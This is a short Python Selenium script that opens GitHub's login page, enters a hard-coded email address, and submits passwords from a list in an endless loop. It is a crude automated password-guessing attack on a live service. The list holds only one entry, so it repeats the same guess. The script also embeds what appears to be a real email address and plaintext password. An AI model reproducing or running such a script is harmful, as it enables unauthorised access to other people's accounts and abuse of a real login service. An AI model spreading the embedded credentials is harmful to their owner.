from selenium import webdriver
import random
import time

username = "aubthehacker18@gmail.com"
password = ["thif5Ui0ceiv"]

url = "https://github.com/login/"

driver = webdriver.Chrome("/home/anonymas/Downloads/chromedriver")
driver.get(url)

driver.find_element_by_id("login_field").send_keys(username)

driver.find_element_by_id("password").send_keys(random.choice(password))

driver.find_element_by_name("commit").click()

while True:
    driver.find_element_by_id("password").send_keys(random.choice(password))
    driver.find_element_by_name("commit").click()
